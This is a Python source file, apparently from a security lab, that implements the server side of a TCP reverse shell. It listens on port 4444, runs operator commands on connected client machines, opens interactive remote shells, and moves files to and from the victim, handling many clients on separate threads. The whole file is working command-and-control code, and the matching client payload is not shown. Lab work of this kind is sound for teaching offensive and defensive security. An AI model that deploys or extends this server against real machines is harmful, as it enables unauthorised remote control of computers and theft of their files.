# server.py
#
# Name: Justin Shultz
# ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
# Lab: Build a TCP Python reverse shell with Pyinstaller
#
# This Python script implements a reverse shell server that listens for incoming connections from clients.
# Once a client connects, the server allows the operator to send commands for remote execution, upload and 
# download files, and initiate an interactive shell session on the client machine. The server manages each 
# client in a separate thread, allowing multiple clients to connect simultaneously and handles unexpected 
# disconnects gracefully.

import socket
import threading
import os
import sys

class Client:
    def __init__(self, conn, addr):
        # Initialize client with connection and address, setting up read/write buffers
        self.conn = conn
        self.addr = addr
        self.reader = conn.makefile('r')
        self.writer = conn.makefile('w')
        print(f"Client connected from {addr}")

    def close(self):
        # Close the client connection and notify server
        self.conn.close()
        print("Client disconnected")

def handle_client(client):
    # Main function to handle incoming commands for a connected client
    try:
        while True:
            command = input("Session> ").strip()
            if command == "exit":
                # Close the connection if 'exit' is entered
                print("Exiting server.")
                client.conn.sendall("exit\n".encode())  # Notify client to exit
                client.close()
                os._exit(0)
            elif command == "shell":
                # Start an interactive shell session
                client.conn.sendall("shell\n".encode())
                handle_shell(client)
            elif command.startswith("upload ") or command.startswith("download "):
                # Handle file transfer commands
                handle_file_transfer(client, command)
            else:
                # Send other commands to client for execution
                client.conn.sendall((command + '\n').encode())
                response = client.reader.readline()
                print(response, end='')  # Display client response
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

def handle_shell(client):
    # Start a shell session with the client, enabling interactive command input/output
    print("Starting shell session with client")
    try:
        def recv_from_client():
            # Thread to receive output from client and print it to server's stdout
            while True:
                data = client.conn.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode())
                sys.stdout.flush()

        def send_to_client():
            # Thread to send input from server to client's shell
            while True:
                try:
                    data = input() + "\n"
                    if data.strip() == "exit":
                        client.conn.sendall(data.encode())  # Notify client to exit shell
                        client.close()
                        os._exit(0)  # Exit the server
                    client.conn.sendall(data.encode())
                except EOFError:
                    print("Shell session ended due to EOF.")
                    client.conn.sendall("exit\n".encode())  # Notify client to exit shell
                    client.close()
                    break

        # Start threads for bi-directional communication with the shell
        recv_thread = threading.Thread(target=recv_from_client)
        send_thread = threading.Thread(target=send_to_client)
        recv_thread.start()
        send_thread.start()
        recv_thread.join()
        send_thread.join()
    except Exception as e:
        print(f"Shell session error: {e}")
    finally:
        print("Shell session with client ended")

def handle_file_transfer(client, command):
    # Handle file upload and download commands from the server to the client
    try:
        if command.startswith("upload "):
            # Handle upload command
            _, args = command.split(" ", 1)
            local_file_path, remote_file_path = args.split()
            upload_file(client, local_file_path, remote_file_path)
        elif command.startswith("download "):
            # Handle download command
            _, args = command.split(" ", 1)
            remote_file_path, local_file_path = args.split()
            download_file(client, remote_file_path, local_file_path)
    except Exception as e:
        print(f"File transfer error: {e}")

def upload_file(client, local_file_path, remote_file_path):
    # Upload a file from the server to the client, sending file size and content
    try:
        with open(local_file_path, 'rb') as f:
            file_size = os.path.getsize(local_file_path)
            client.conn.sendall(f"upload {remote_file_path} {file_size}\n".encode())  # Send file size and path
            while chunk := f.read(4096):
                client.conn.sendall(chunk)  # Send file in chunks
        print("File upload to client completed.")
    except Exception as e:
        print(f"Upload error: {e}")

def download_file(client, remote_file_path, local_file_path):
    # Download a file from the client, receiving file size and content
    try:
        client.conn.sendall(f"download {remote_file_path}\n".encode())
        file_size = int(client.reader.readline().strip())  # Receive file size
        with open(local_file_path, 'wb') as f:
            remaining = file_size
            while remaining > 0:
                chunk = client.conn.recv(min(4096, remaining))
                if not chunk:
                    break
                f.write(chunk)
                remaining -= len(chunk)
        print("File download from client completed.")
    except Exception as e:
        print(f"Download error: {e}")

def main():
    # Main function to start the server and listen for incoming client connections
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))  # Bind server to all available IP addresses
    server.listen(5)
    print("Server listening on 0.0.0.0:4444")

    try:
        while True:
            # Accept client connections and start a new thread for each client
            conn, addr = server.accept()
            client = Client(conn, addr)
            threading.Thread(target=handle_client, args=(client,)).start()
    except KeyboardInterrupt:
        print("Server is shutting down.")
    finally:
        server.close()

if __name__ == "__main__":
    main()
